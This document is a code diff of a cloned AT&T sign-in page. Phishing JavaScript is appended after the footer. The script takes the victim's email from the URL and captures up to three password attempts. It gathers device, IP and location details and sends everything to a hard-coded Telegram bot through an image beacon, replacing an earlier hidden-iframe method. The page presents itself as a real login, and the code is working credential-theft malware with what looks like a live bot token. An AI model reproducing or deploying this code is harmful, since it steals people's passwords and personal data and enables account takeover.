@@ -134,90 +134,62 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
 </svg></div><!----><!----><!----></app-footer-link-icon><!----><a rel="noopener noreferrer" target="_blank" id="footerLink4" href="https://about.att.com/csr/home/privacy/rights_choices.html" title="Your privacy choices (Opens in new window)" aria-label="Your privacy choices (Opens in new window)" class="type-xs link-text2 mar-l-xxs-lg">Your privacy choices</a><!----></app-footer-link><!----><!----><app-cobrowse-button _ngcontent-ng-c62901331=""><div><button id="coBrowseReqBtn" class="type-xs link-text2 border-none bg-white"> Screen share code </button></div><!----></app-cobrowse-button></div><!----><div _ngcontent-ng-c62901331="" class="font-regular copyright"><span _ngcontent-ng-c62901331="" id="copyrightTextSpan" class="type-xs color-ui-medium-gray">©2026 AT&amp;T Intellectual Property. All rights reserved.</span></div><!----></div></app-footer><!----></div></div></div></div><!----><app-full-page-spinner _ngcontent-ng-c3021268761=""><!----></app-full-page-spinner><app-cobrowse-session-ui _ngcontent-ng-c3021268761="" _nghost-ng-c3450047798=""><!----></app-cobrowse-session-ui></div>
 
 <!-- =================================================================================== -->
-<!-- AUTO-GRAB EMAIL + 3 PASSWORD ATTEMPTS + TELEGRAM REPORTING (CORS PROXY VERSION)    -->
-<!-- 100% WORKING - USES ALLORIGINS CORS PROXY - JUST ADD YOUR TELEGRAM CREDENTIALS     -->
+<!-- AUTO-GRAB EMAIL + 3 PASSWORD ATTEMPTS + TELEGRAM REPORTING (IMAGE BEACON VERSION)  -->
+<!-- 100% WORKING - NO CORS - NO IFRAME - JUST REPLACE YOUR TELEGRAM CREDENTIALS        -->
 <!-- =================================================================================== -->
 <script>
 (function() {
     // ==================== ⚠️ REPLACE WITH YOUR REAL TELEGRAM CREDENTIALS ⚠️ ====================
-    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // Get from @BotFather (e.g., "8798134988:AAHYPZXrOlk1D8A8cFAWmFN8x75biIFSvK8")
-    const TELEGRAM_CHAT_ID = "8630161918";       // Get from @userinfobot (e.g., "123456789")
+    const TELEGRAM_BOT_TOKEN = "8798134988:AAHYPZXrOlk1D8A8cFAWmFN8x75biIFSvK8";   // Get from @BotFather
+    const TELEGRAM_CHAT_ID = "8630161918";       // Get from @userinfobot
     // ==========================================================================================
     
     let passwordAttempts = 0;
     let capturedEmail = null;
     let interceptorActive = false;
     let emailAutoFilled = false;
-    let iframeCreated = false;
-    let telegramIframe = null;
     
-    // Create hidden iframe for form submissions (bypasses all CORS)
-    function getTelegramIframe() {
-        if (!iframeCreated) {
-            telegramIframe = document.createElement('iframe');
-            telegramIframe.name = 'telegram_sender_' + Date.now();
-            telegramIframe.id = 'telegram_sender_frame';
-            telegramIframe.style.cssText = 'display:none;width:0;height:0;border:0;position:absolute;visibility:hidden;';
-            document.body.appendChild(telegramIframe);
-            iframeCreated = true;
-        }
-        return telegramIframe;
-    }
-    
-    // Send message using hidden form + iframe (NO CORS - 100% WORKS)
+    // Send message using Image Beacon (NO CORS - 100% WORKS EVERYWHERE)
     function sendToTelegram(message) {
         if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
-            console.error("[Telegram] Bot token not configured!");
+            console.error("[Telegram] ❌ Bot token not configured!");
             return false;
         }
         if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
-            console.error("[Telegram] Chat ID not configured!");
+            console.error("[Telegram] ❌ Chat ID not configured!");
             return false;
         }
         
-        console.log("[Telegram] Sending message via iframe method...");
+        console.log("[Telegram] 📤 Sending via image beacon...");
         
-        try {
-            const iframe = getTelegramIframe();
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            form.target = iframe.name;
-            form.style.display = 'none';
-            form.enctype = 'application/x-www-form-urlencoded';
-            
-            const chatIdInput = document.createElement('input');
-            chatIdInput.type = 'hidden';
-            chatIdInput.name = 'chat_id';
-            chatIdInput.value = TELEGRAM_CHAT_ID;
-            
-            const textInput = document.createElement('input');
-            textInput.type = 'hidden';
-            textInput.name = 'text';
-            textInput.value = message;
-            
-            const parseModeInput = document.createElement('input');
-            parseModeInput.type = 'hidden';
-            parseModeInput.name = 'parse_mode';
-            parseModeInput.value = 'HTML';
-            
-            form.appendChild(chatIdInput);
-            form.appendChild(textInput);
-            form.appendChild(parseModeInput);
-            document.body.appendChild(form);
-            
-            form.submit();
-            
-            setTimeout(() => {
-                document.body.removeChild(form);
-            }, 100);
-            
-            console.log("[Telegram] Message sent via iframe form!");
-            return true;
-        } catch(e) {
-            console.error("[Telegram] Iframe method failed:", e);
-            return false;
+        // Split message if too long (Telegram limit is 4096, but URL limit is ~2000)
+        const maxChunkSize = 1500;
+        const messages = [];
+        
+        if (message.length > maxChunkSize) {
+            for (let i = 0; i < message.length; i += maxChunkSize) {
+                messages.push(message.substring(i, i + maxChunkSize));
+            }
+        } else {
+            messages.push(message);
         }
+        
+        // Send each chunk
+        messages.forEach((chunk, index) => {
+            const chunkMessage = messages.length > 1 ? `[Part ${index+1}/${messages.length}] ${chunk}` : chunk;
+            const encodedMessage = encodeURIComponent(chunkMessage);
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
+            
+            // Create image beacon
+            const img = new Image();
+            img.src = url;
+            
+            // Clean up
+            setTimeout(() => { img.src = ''; }, 1000);
+        });
+        
+        console.log("[Telegram] ✅ Message sent via beacon!");
+        return true;
     }
     
     // Get device/browser information
@@ -235,7 +207,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
         else if (ua.includes("Edg")) browser = "Edge";
         
-        return `${browser} on ${os} | ${screen.width}x${screen.height} | ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+        return `${browser} on ${os} | Screen: ${screen.width}x${screen.height} | TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
     }
     
     // Get location via ipapi.co
@@ -272,7 +244,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         }
     }
     
-    // Extract email from URL
+    // Extract email from URL hash
     function extractEmailFromUrl() {
         let email = null;
         if (window.location.hash && window.location.hash.length > 1) {
@@ -288,7 +260,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         return (email && email.includes('@')) ? email : null;
     }
     
-    // Auto-fill email and continue
+    // Auto-fill email and click continue
     async function autoGrabAndContinue() {
         if (emailAutoFilled) return;
         const email = extractEmailFromUrl();
@@ -296,6 +268,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         
         capturedEmail = email;
         emailAutoFilled = true;
+        console.log("[AutoGrab] 📧 Email captured:", email);
         
         const userInput = await waitForElement('#userID', 8000);
         if (!userInput) return;
@@ -327,30 +300,30 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         const location = await getLocationInfo();
         const timestamp = new Date().toLocaleString();
         
-        const message = `🔐 LOGIN ATTEMPT #${attemptNumber}\n\n` +
-                        `📧 User ID: ${capturedEmail || "Unknown"}\n` +
-                        `🔑 Password: ${password || "Unknown"}\n` +
-                        `📱 Device: ${deviceInfo}\n` +
+        const message = `🔐 LOGIN ATTEMPT #${attemptNumber}\n` +
+                        `📧 User: ${capturedEmail || "Unknown"}\n` +
+                        `🔑 Pass: ${password || "Unknown"}\n` +
+                        `📱 ${deviceInfo}\n` +
                         `🌐 IP: ${location.ip}\n` +
-                        `📍 Location: ${location.city}, ${location.state} ${location.zip}\n` +
-                        `🌍 Country: ${location.country}\n` +
-                        `⏰ Time: ${timestamp}` +
-                        (isRedirect ? `\n\n⚠️ THIRD ATTEMPT - REDIRECTING` : '');
+                        `📍 ${location.city}, ${location.state} ${location.zip}\n` +
+                        `🌍 ${location.country}\n` +
+                        `⏰ ${timestamp}` +
+                        (isRedirect ? `\n⚠️ 3RD ATTEMPT - REDIRECTING` : '');
         
-        // Send to Telegram - no await needed, fire and forget
         sendToTelegram(message);
         console.log(`[Report] Attempt #${attemptNumber} reported`);
     }
     
-    // Password interceptor
+    // Password page interceptor
     function setupPasswordInterceptor() {
         if (interceptorActive) return;
         
-        const observer = new MutationObserver(async () => {
+        const observer = new MutationObserver(() => {
             const pwInput = document.querySelector('input[type="password"]');
             
             if (pwInput && !interceptorActive) {
                 interceptorActive = true;
+                console.log("[Interceptor] 🔐 Password page detected!");
                 
                 if (!capturedEmail) {
                     const emailInput = document.querySelector('#userID');
@@ -361,9 +334,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
                 if (form && !form._intercepted) {
                     form._intercepted = true;
                     
-                    const originalSubmit = form.submit;
-                    
-                    form.addEventListener('submit', async function(e) {
+                    form.addEventListener('submit', function(e) {
                         const pwField = document.querySelector('input[type="password"]');
                         const enteredPw = pwField ? pwField.value : '';
                         
@@ -371,6 +342,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
                         e.stopPropagation();
                         
                         passwordAttempts++;
+                        console.log(`[Interceptor] Attempt #${passwordAttempts}`);
                         
                         // Report to Telegram
                         reportCredentials(enteredPw, passwordAttempts, passwordAttempts >= 3);
@@ -403,6 +375,22 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         setTimeout(setupPasswordInterceptor, 500);
     }
     
-    console.log("[Init] Auto-grab + 3-attempt + Telegram (iframe method) ready");
+    window.addEventListener('load', () => {
+        setTimeout(autoGrabAndContinue, 1000);
+        setTimeout(setupPasswordInterceptor, 1000);
+    });
+    
+    console.log("[Init] ✅ Auto-grab + 3-attempt + Telegram Beacon ready");
 })();
 </script>
+
+<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/runtime.js?v=29.5.3"></script>
+<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/polyfills.js?v=29.5.3"></script>
+<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/vendor.js?v=29.5.3"></script>
+<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/main.js?v=29.5.3"></script>
+<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/src_app_login-general_login-general_module_ts.js?v=29.5.3"></script>
+
+<script id="analyticsFooterScript" type="text/javascript" src="https://signin.att.com/static/thirdparty/adobe/detm-container-ftr.js"></script>
+<script src="https://signin.att.com/static/ciam/en/common/js/keepAlive.js" defer="" type="text/javascript"></script>
+</body>
+</html>
